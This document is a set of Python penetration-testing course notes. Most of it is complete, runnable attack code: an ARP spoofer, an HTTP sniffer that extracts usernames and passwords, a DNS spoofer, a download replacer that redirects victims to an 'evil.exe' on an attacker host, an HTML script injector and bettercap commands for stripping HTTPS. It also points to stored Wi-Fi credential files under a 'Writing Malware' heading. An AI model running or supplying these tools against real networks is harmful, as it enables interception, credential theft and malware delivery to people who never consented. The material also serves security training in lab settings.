# <span style="color:red"> Penetration Testing and Ethical Hacking with Python <span>

## Penetration Testing (Pentest) Content:
1.  What is Penetration Testing
2.  Cyber Security Tests and Audits
    - Security Audits
    - Vunerability Assesment
    - Penetration Tests
3. Asset, Threat, Vulnerability, Risk
4. Pentest Approaches 
    - Black Box, Grey Box, White Box
5. Planning a Pentest
    - Purpose 
    - Scope
    - Requirements 
    - Restrictions
6.Penetration Test Phases
    - Reconnaissance
    - Scanning 
    - Exploitation and Post Exploitation 
    - Covering Tracks
    -Reporting



## MAC Address
A MAC is an acronym for ***Media Access Control***.   
The MAC address is used to identify devices on the indetify devices in order to transfer resources from one device to another device.

## Features of MAC address
- Permanent
- Physical
- Unique
- Assigned to a device by manufacture 

## The MAC address can be changed to
1. Increase ***anonimity***
2. ***Impersonate*** other devices
3. ***Bypass*** filters

> Command to list the network interfaces is ifconfig.

> Use the man ifconfig for documentation.

To change the MAC address of an interface <interface_name> in terminal use the following commands
- ifconfig <interface_name> down
- ifconfig <interface_name> hw ether **new MAC address**
- ifconfig <interface_name> up

### Example
To change the MAC address of eth0 to 00:11:22:33:44:55, do the following
- ifconfig eth0 down
- ifconfig eth0 hw ether 00:11:22:33:44:55
- ifconfig eth0 up

# Using python to change the MAC address
We need a module callled ***subprocess***. The functions in this module allow us to run system commands. 
```python
# Syntax
import subprocess
subprocess.call("COMMAND", shell=TRUE)
```

### Example of python code to change the MAC address of eth0
```python
import subprocess as sp
sp.call("ifconfig eth0 down", shell=True)
sp.call("ifconfig eth0 hw ether 00:11:22:33:44:55", shell=True)
sp.call("ifconfig eth0 up", shell=True)
```

## Handling User Input
We can allow users to input their choice of interface as shown below
```python
import subprocess as sp

interface = input("Enter the interace: ")
new_mac = input("Enter new MAC address: ")

print(f"[+] Changing MAC address for {interface} to {new_mac}")

sp.call("ifconfig " + interface + " down ", shell=True)
sp.call("ifconfig " + interface + "hw ether " + new_mac, shell=True)
sp.call("ifconfig " + interface + " up ", shell=True)
```

One drawback of the code above is that it is not secure since we allow users to input anything.  For example a user can enter the follwing when prompted to enter the interface.
> Enter interface: eth0; ls;

The variable **interface** will hold the string "eth0; ls;" when the program is run, ls will list the files and folders in the current directory. The semi-colon is used to execute a new command,hence the above code is not secure.

To make it secure, the argument of the function ***call*** should be a list. he following code illustrates the security measure.
```python
import subprocess as sp

interface = input("Enter the interace: ")
new_mac = input("Enter new MAC address: ")

print(f"[+] Changing MAC address for {interface} to {new_mac}")

sp.call(["ifconfig", interface, "down"])
sp.call(["ifconfig", interface, "hw", "ether", new_mac])
sp.call(["ifconfig", interface, "up"])
```

# Handling Command-line arguments
Use the module ***optparse*** to handle command line arguments.

Optparse seems like a pretty cool module for processing command line options and arguments in Python. It is intended to be an improvement over the old getopt module. Optparse supports short style options like -x, long style options like --xhtml and positional arguments. Optparse also makes it easy to add default options and help text. For more information, see the [optparse documentation](https://docs.python.org/3/library/optparse.html)
### Example
```python 
from optparse import OptionParser
import subprocess as sp

parser = OptionParser()
parser.add_option("-i", "--interface", dest="interface", help="Interface to change MAC address.")
parser.add_option("-m", "--mac", dest="new_mac", help="New MAC address.")

(options, args) = parser.parse_args()
```




Applying it to the MAC address changer, we have 
```python
#!/usr/bin/env python3

from optparse import OptionParser
import subprocess as sp

parser = OptionParser()
parser.add_option("-i", "--interface", dest="interface", help="Interface to change MAC address.")
parser.add_option("-m", "--mac", dest="new_mac", help="N# Maew MAC address.")

(options, args) = parser.parse_args()


interface = options.interface
new_mac = options.new_mac

print(f"[+] Changing MAC address for {interface} to {new_mac}")

sp.call(["ifconfig", interface, "down"])
sp.call(["ifconfig", interface, "hw", "ether", new_mac])
sp.call(["ifconfig", interface, "up"])
```

> **Note**: The ***optparse*** module is deprecated, although it works in python3. In python3, we could aso use the more recent one called ***argparse*** 

# Functions and Making decisions in Python
```python
#!/usr/bin/env python3

from optparse import OptionParser
import subprocess as sp

def get_cmd_args():
    parser = OptionParser()
    parser.add_option("-i", "--interface", dest="interface", \
        help="Interface to change MAC address")
    parser.add_option("-m", "--mac", dest="new_mac", help="New MAC address")

    (options, args) = parser.parse_args()
    
    if not options.interface:
    	parser.error("[-] Please specify an interface, use --help for info.")
    if not option.new_mac:
    	parser.error("[-] Please specify a MAC address, use --help for info.")
    return options
   

def mac_changer(interface, new_mac):
    print(f'[+] Changing MAC address for {interface} to {new_mac}')

    sp.call(["ifconfig", interface, "down"])
    sp.call((["ifconfig", interface, "hw", "ether", new_mac]))
    sp.call(["ifconfig", interface, "up"])

options =get_cmd_args()
mac_changer(options.interface, options.new_mac)
```

# MAC changer -- Simple Algorithm
> Goal is to check if the MAC address was changed

#### Steps for the algorithm
1. Execute and read ifconfig
2. Read the MAAC address from the output
3. Chech if MAC ifconfig is what the ser requested.
4. Print appropriate message.

The following is a complete program  to change MAC address.
```python
#!/usr/bin/env python3

from optparse import OptionParser
import subprocess as sp
import re

def get_current_MAC(interface):
	ifconfig_result = sp.check_output(["ifconfig",interface])
	# print(ifconfig_result)
	mac_address_search_result=re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
	if mac_address_search_result:
		# print(mac_address_search_result.group(0))
		return mac_address_search_result.group(0)
	else:
		print("[-] Could not read MAC address.")

def get_cmd_args():
    parser = OptionParser()
    parser.add_option("-i", "--interface", dest="interface", \
        help="Interface to change MAC address")
    parser.add_option("-m", "--mac", dest="new_mac", help="New MAC address")

    (options, args) = parser.parse_args()
    
    if not options.interface:
    	parser.error("[-] Please specify an interface, use --help for info.")
    if not options.new_mac:
    	parser.error("[-] Please specify a MAC address, use --help for info.")
    return parser.parse_args()
   

def mac_changer(interface, new_mac):
    print(f'[+] Changing MAC address for {interface} to {new_mac}')

    sp.call(["ifconfig", interface, "down"])
    sp.call((["ifconfig", interface, "hw", "ether", new_mac]))
    sp.call(["ifconfig", interface, "up"])

(options, args) = get_cmd_args()
current_mac= get_current_MAC(options.interface)
print(f'Current MAC Address: {current_mac}')
if current_mac:
	mac_changer(options.interface, options.new_mac)
else:
	print(f'[-] The interface {options.interface} has no MAC addredd')

current_mac= get_current_MAC(options.interface)
if current_mac == options.new_mac:
	print(f'[+] MAC address successfully changed to {current_mac}.')
else:
	print(f'[-] MAC address did not get changed.')

```

## <span style="color:red">Information Gathering: Reconnaisance <span>
### Section 4:  Programming a Network Scanner
Information gathering is one of the most important steps in hacking or penetration testing.

## Network Scanner
Network scanning helps to 
- ***Discover*** all devices on the network
- Display their ***IP address***
- Display their ***MAC address***
> Some tools for network scanning are *Nmap* and *netdiscover*

We will use python to write a network scanner.

## Introduction to ARP (Address Resolution Protocol)
***ARP*** is a protocol that a device A uses to communicate with another devices B. Device A will send an ARP request to all devices on the network asking which one has IP address IP_B. Device B responds and sends back its MAC address to device A. This establishes a medium for communication between devices A and B. The ARP is responsible for resolving the IP_B to the MAC address of device B.

To implement the APR, we use the python module called ***scapy*** See the [Scapy Documentaion](https://scapy.readthedocs.io/en/latest/index.html)

```python
import scapy.all as scapy

def scan(ip):
    scapy.arping(ip)
```

## Network Scanner Algorithm 
> The goal of this algoritm is to discover all clients on a network

#### Steps in the algorithm
1. Create an ARP request directed to braodcast MAC address asking for IP
    - Use ARP to ask which connected device has target the IP
    - Set destination MAC to broadcast MAC
2. Send packet and receive response
3. Parse the response
4. Print result

## Python code for network scanning
```python 
from optparse import OptionParser
import scapy.all as scapy

def get_commd_line_arg() -> str:
    parser = OptionParser()
    parser.add_option("-i", "--iprange", dest="ip_range", help="Range of IP Address.\
         Eg. 10.0.2.5 or 10.0.2.1/24")
    
    option, arg = parser.parse_args()
    if not option.ip_range:
        print(f"[-] Please specify a range for IP address, use --help")
    
    return option.ip_range

def scan(ip) -> list:
  
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    client_list = []
    for elt in answered_list:
        client_dict = {"ip":elt[1].psrc, "mac":elt[1].hwsrc}
        client_list.append(client_dict)
        
    return client_list

def print_result(result_list) -> None:
    for client in result_list:
        print(client)


ip_range = get_commd_line_arg()
scan_res = scan(ip_range)
print_result(scan_res)
```

# Section 5 Writing an ARP Spoofer
In cybersecurity, ‘spoofing’ is when fraudsters pretend to be someone or something else to win a person’s trust. The motivation is usually to gain access to systems, steal data, steal money, or spread malware.

### ARP spoofing
Address Resolution Protocol (ARP) is a protocol that enables network communications to reach a specific device on a network. ARP spoofing, sometimes also called ARP poisoning, occurs when a malicious actor sends falsified ARP messages over a local area network. This links the attacker’s MAC address with the IP address of a legitimate device or server on the network. This link means the attacker can intercept, modify, or even stop any data intended for that IP address.

## How to run an ARP spoof attack using command ***arpspoof***:
The following command fools the target witb IP address 10.0.2.4.
> arpspoof -i etho  -t 10.0.2.4 10.0.2.1

The following command fools the router with IP address 10.0.2.1.
> arpspoof -i etho  -t 10.0.2.1 10.0.2.4

Before executing the commands above, run the following command to enable packet fowarding: 
> echo 1 > /proc/sys/net/ipv4/ip_forward

## Creating an ARP response using python.
Use the following python code to create an ARP responce
```python 
#!/usr/bin/env python3

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip) # Fooling the target
```
When the code above is executed, a response is sent to the target machine by the attacker. The target machine will associate the ip address, ***source_ip***, of the router to the attackers MAC address. This repoonse fools the target into thinking that the attacker is the router.

## Dynamic printing
```python
print(f'\r [+] Packets sent: {sent_packet_count}', end="")
```

The spoofing program
```python
#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse
# import sys

def get_terminal_cmd():
   parser = argparse.ArgumentParser(
      prog="arp_spoof",
      description="Man in the middle",
      epilog="Thank you for using %(prog)s :)"
   )
   parser.add_argument("-t", "--target", help="Ip address of target machine")
   parser.add_argument("-s", "--source", help="Ip address of router")
   args = parser.parse_args()
   return args



def get_mac(ip)-> str:
  
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc
    

def spoof(target_ip, source_ip):
      target_mac = get_mac(target_ip)
      packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip) # Fooling the target
      scapy.send(packet, verbose=False)


def restore(des_ip, src_ip):
   des_mac = get_mac(des_ip)
   src_mac = get_mac(src_ip)
   packet = scapy.ARP(op=2, pdst=des_ip, hwdst=des_mac, psrc=src_ip, hwsrc=src_mac)
   scapy.send(packet, count=4, verbose=False)

args = get_terminal_cmd()
target_ip = args.target
gateway_ip = args.source

try:
   sent_packet_count = 0
   while True:

      spoof(target_ip, gateway_ip)
      spoof(gateway_ip, target_ip)
      sent_packet_count += 2
      # print(f'[+] Packets sent: {sent_packet_count}', end='\r', flush=True)
      print(f'[+] Packets sent: {sent_packet_count}', end="\r", flush=True)
      # print(f'\r [+] Packets sent: {sent_packet_count}'),
      # sys.stdout.flush()
      time.sleep(2)
except KeyboardInterrupt:
   print(f'\n CTRL+C detected ... Restoring ARP tables ... please wait ... Quitting')
   restore(target_ip, gateway_ip)
   restore(gateway_ip, target_ip)
   

#print(args.target)
#print(get_mac(args.target))
```


# Section 6 Writing a packet sniffer
Scapy has a function called ***sniff***


```python

#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load_byte = packet[scapy.Raw].load
        load_str = str(load_byte)
        keywords = ["username", "user", "login", "password", "pass", "email", "phone number"]
        for kw in keywords:
            if kw in load_str:
                return load_str
                #print(f'\n\n [+] Possibe username/password >> {load}\n\n')
                #break


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        url = get_url(packet).decode()
        print(f"[+] HTTP Request >> {url}")

        login_info = get_login_info(packet)
        if login_info:
            print(f'\n\n [+] Possibe username/password >> {login_info}\n\n')
        
    

sniffer("eth0")
```

# Section 7: Writing a DNS Spoofer
- Scapy can be used to
    1. Create a packet
    2. Analyse packets
    3. Send and receive packets
- It cannot be used to intercept packets/flows.

> Previously we wrote a program (arp_spoof.py) to place Kali linux as a man-in-the-middle.
> Also, we have a program (packet_sniffer.py) that can sniffs data packets. 

### Intercepting Packets - Creating a Proxy
We want to intercept packets, modify them and send then release the packets after modificatrion.

### Redirection of packets using <span style="color:red"> iptables <span>
Iptables is a firewall program for Linux. It will monitor traffic from and to your server using tables. These tables contain sets of rules, called chains, that will filter incoming and outgoing data packets.



The linux command to traps incoming traffic:
> iptables -I FORWARD -j NFQUEUE --queue-num 0

Modify trapped packets using a module called netfilterqueue
```python
#!/usr/bin/env python3 

import netfilterqueue as nq

def process_packet(packet):
    print(packet)
    # packet.drop()
    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

After this flush the queue with the folowing command
> iptables --flush

#### Test on a local machine: 
Use the output and input chain of the iptables. 
> iptables -I OUTPUT -j NFQUEUE --queue-num 0
> iptables -I INPUT -j NFQUEUE --queue-num 0

#### Converting packets to scapy packets
```python
#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet.show())
    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

#### DNS spoofing
```python
#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy

web_add = "www.bccancer.bc.ca"
redirect_ip = "10.0.2.15"

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #Checking for DNS response using DNSRR. Use DNSQR for DNS requests
    if scapy_packet.haslayer(scapy.DNSRR):
        qname =scapy_packet[scapy.DNSQR].qname
        #print(qname)
        if web_add in str(qname):
            print("[+] Spoofing target")

            #Creating a DNS response and redirect it to any ip address
            answer = scapy.DNSRR(rrname = qname, rdata= redirect_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # delete the len and chkcum in the IP and UDP layers
            # to prevent corruption  our modified data
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

        #print(scapy_packet.show())
    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


```
> Always run iptables --flush after modifying iptables.


# Section 8: Writing a File Interceptor
In this section we're going to modify data in the htttp layer and in particular replace downlaod requests. 
> <span style="color:red;"> Note: packet sent over the http layer are placed in the Raw layer. </span>

#### Filtering Traffic based on the port used
The goal is to write a program that can detect whrn a user requests to download  a dertian file. When detected, we will serve the user with a different file.

 The template for this program will be the DNS spoof progam from the previous section.

 We need to check for http(s) request and response.

 > An example of a packet with different layers. In particular this is a request being sent beacuce in the TCP layer, the field dport is set to http(s).

 ```http layer

 None
###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 79
  id        = 23667
  flags     = DF
  frag      = 0
  ttl       = 64
  proto     = tcp
  chksum    = 0xc1c2
  src       = 10.0.2.15
  dst       = 34.117.237.239
  \options   \
###[ TCP ]### 
     sport     = 40994
     dport     = https
     seq       = 2539263128
     ack       = 898289
     dataofs   = 5
     reserved  = 0
     flags     = PA
     window    = 64028
     chksum    = 0xb848
     urgptr    = 0
     options   = []
###[ Raw ]### 
        load      = '\x17\x03\x03\x00"
 ```

A response will have the sport set to http(s)

```python
#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80:
            print(f'HTTP Request')
            print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print(f'HTTP Response')
            print(scapy_packet.show())


    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


```

#### Analysing and Intercepting HTTP requests and moifying Responses
> This is an http request
```http layer 
HTTP Request
###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 473
  id        = 58839
  flags     = DF
  frag      = 0
  ttl       = 64
  proto     = tcp
  chksum    = 0x3ed3
  src       = 10.0.2.15
  dst       = 143.186.120.171
  \options   \
###[ TCP ]### 
     sport     = 38990
     dport     = http
     seq       = 2581237551
     ack       = 2682544
     dataofs   = 5
     reserved  = 0
     flags     = PA
     window    = 64240
     chksum    = 0x75c
     urgptr    = 0
     options   = []
###[ Raw ]### 
        load      = 'GET /testsite/downloads/Hello.txt HTTP/1.1\r\nHost: demo.borland.com\r\nUser-Agent: 
        Mozilla/5.0 (X11; Linux x86_64; rv:102.0) ...






HTTP Response
###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 502
  id        = 22341
  flags     = 
  frag      = 0
  ttl       = 255
  proto     = tcp
  chksum    = 0x4e48
  src       = 143.186.120.171
  dst       = 10.0.2.15
  \options   \
###[ TCP ]### 
     sport     = http
     dport     = 38990
     seq       = 2682544
     ack       = 2581237984
     dataofs   = 5
     reserved  = 0
     flags     = PA
     window    = 32335
     chksum    = 0xd0f2
     urgptr    = 0
     options   = []
###[ Raw ]### 
        load      = 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\ ...
```


> ack = 2682544 in  Request is same as seq = 2682544 in response: This shows that the response corresponds to the request made.

#### Intercepting and Replacing downloads on the network
1. Run the arp_spoof.py to become man in the middle
2. Run the replace_download.py to replace the victims download request.

```python
#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy

ack_list = []
attack_load = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/evil-files/evil.exe\n\n"

def set_load(scapy_packet, load):
    print(f'[+] replacing file')
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum

    return scapy_packet
    

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80:
            print(f'HTTP Request')
            if '.txt'.encode() in scapy_packet[scapy.Raw].load:
                print(f'[+] txt Request')
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print(f'HTTP Response')
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                modified_scapy_packet = set_load(scapy_packet, attack_load)

                packet.set_payload(bytes(modified_scapy_packet))
                #print(scapy_packet.show())


    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

# Section 9: Writing a Code Injector
In http requests, removing the ***Accept-Encoding: gzip, ...*** from the load in the raw layer will allow the browzer present html in plain text.


### Code for injection
```python
#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy
import re

def set_load(scapy_packet, load):
    print(f'[+] replacing file')
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum

    return scapy_packet
    

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #print(type(scapy_packet))
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80:
            print(f'HTTP Request')
            load=re.sub("Accept-Encoding:.*?\r\n".encode(), "".encode(), load)
            #print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print(f'HTTP Response')
            injection_code = "<script>alert('Test');</script>"
            load = load.replace("</body>".encode(), (injection_code+"</body>").encode())

            # Rexgex: Non-capturing group
            content_length_search = re.search("(?:Content-Length:\s)(\d*)".encode(), load)
            
            if content_length_search and "text/html".encode() in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length).encode())
                print(f'Previous content length: {int(content_length)}\
                     \n Current content length: {new_content_length}')
            #print(scapy_packet.show()) 

        # This gets executed if the load is modified   
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))


    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


```


# Section 10: Bypassing HTTPS
- Watch again
Use the following implementation of a network penetetrating tool called ***bettercap*** 
> bettercap - iface eth0 -caplet hstshijack/hstshijac
> bettercap: replce  80 with 8080 in replace_download.py. 


- Need to modify the ports in code_injector program


> <span style="color:red;"> Some websites use use hsts: Here, bypassing https fails for now. </span>


### Bypassing https and Sniffing Loging credentials.
1. Run packet_sniffer.py
2. Run arp_spoof.py to make attaker MITM.
3. Execute the command
    >  bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/hstshijack/hstshijack.cap

### Replacing downloads on https
1. Run arp_spoof.py to make attaker MITM.
2. Execute the command
    > bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/hstshijack/hstshijack.cap
3. Run the following commands:
    > iptables -I INPUT -j NFQUEUE --queue-num 0
    > iptables -I OUTPUT -j NFQUEUE --queue-num 0 
4. Run replace_download_https.py 

### Injecting code in https pages
1. Run arp_spoof.py to make attaker MITM.
2. Execute the command
    > bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/hstshijack/hstshijack.cap
3. Run the following commands:
    > iptables -I INPUT -j NFQUEUE --queue-num 0
    > iptables -I OUTPUT -j NFQUEUE --queue-num 0 
4. Run code_injection_https.py 


# Section 11: Writing an ARP Spoof detector
```python
#!/usr/bin/env python3

import scapy.all as scapy

def get_mac(ip)-> str:
   arp_request = scapy.ARP(pdst = ip)
   broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
   arp_request_broadcast = broadcast/arp_request
   answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
   return answered_list[0][1].hwsrc

def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2:
        try:
            real_mac = get_mac(packet[scapy.ARP].psrc)
            response_mac = packet[scapy.ARP].hwsrc
            if real_mac != response_mac:
                print(f"[+] You're under attack !!")
        except IndexError:
            pass
        #print(packet.show())

       
        
    

sniffer("eth0")
```

# Section 12: Writing Malware
#### Getting Wifi Passwords on Linux
On Linux, all previously connected networks are located in the folder 
> /etc/NetworkManager/system-connections as INI files. So we just have to read the files and print the information.
